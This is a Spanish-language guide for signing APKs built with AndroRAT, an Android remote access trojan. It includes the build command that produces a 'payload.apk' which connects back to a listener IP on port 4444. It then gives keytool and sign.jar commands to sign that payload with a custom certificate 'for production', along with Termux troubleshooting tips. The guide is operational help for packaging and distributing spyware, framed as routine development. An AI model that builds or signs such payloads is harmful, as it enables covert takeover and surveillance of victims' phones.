# Guía de Firma de APK - AndroRAT

## Firma por Defecto (Debug)

AndroRAT usa automáticamente un certificado de debug integrado en `sign.jar` para firmar APKs durante el desarrollo.

```bash
python3 androRAT.py --build -i 192.168.1.33 -p 4444 -o payload.apk
```

El APK será firmado automáticamente con el certificado de debug.

## Crear tu Propio Certificado (Recomendado para Producción)

### Paso 1: Generar un Keystore Personalizado

```bash
keytool -genkeypair -v \
  -keystore my-release-key.jks \
  -keyalg RSA \
  -keysize 2048 \
  -validity 10000 \
  -alias my-key-alias \
  -storepass your_password \
  -keypass your_password \
  -dname "CN=YourName,OU=YourOrg,O=YourCompany,L=City,ST=State,C=US"
```

**Importante:** Guarda tu contraseña de forma segura. **No subas el archivo .jks a GitHub.**

### Paso 2: Firmar APK con tu Certificado

```bash
# Después de compilar
java -jar Jar_utils/sign.jar \
  -a payload.apk \
  --ks my-release-key.jks \
  --ksAlias my-key-alias \
  --ksPass pass:your_password \
  --ksKeyPass pass:your_password \
  --skipZipAlign \
  --allowResign
```

### Paso 3: Verificar Firma

```bash
java -jar Jar_utils/sign.jar -y payload-signed.apk
```

## Esquemas de Firma Soportados

- **V1 (JAR Signature)** - Android 2.3+
- **V2 (APK Signature Scheme)** - Android 7.0+
- **V3 (APK Signature Scheme v3)** - Android 9.0+

## Seguridad

### ⚠️ Nunca compartas tu keystore

- **NO** subas archivos `.jks` o `.keystore` a GitHub
- **NO** compartas tus contraseñas
- Usa `.gitignore` para excluir keystores:

```gitignore
*.jks
*.keystore
my-release-key.jks
```

### ✅ Para distribución segura

1. Usa certificados únicos por proyecto
2. Almacena keystores en ubicaciones seguras
3. Usa contraseñas fuertes
4. Considera usar Android App Bundle (.aab) para Play Store

## Troubleshooting

### Error: "could not execute zipalign"

Esto es normal en Termux. Usa el flag `--skipZipAlign`:

```bash
java -jar Jar_utils/sign.jar -a payload.apk --skipZipAlign
```

### Error: "already signed"

Usa `--allowResign` para re-firmar:

```bash
java -jar Jar_utils/sign.jar -a payload.apk --allowResign
```

## Referencias

- [Android App Signing](https://developer.android.com/studio/publish/app-signing)
- [Uber APK Signer](https://github.com/patrickfav/uber-apk-signer)
- [APK Signature Scheme v3](https://source.android.com/security/apksigning/v3)
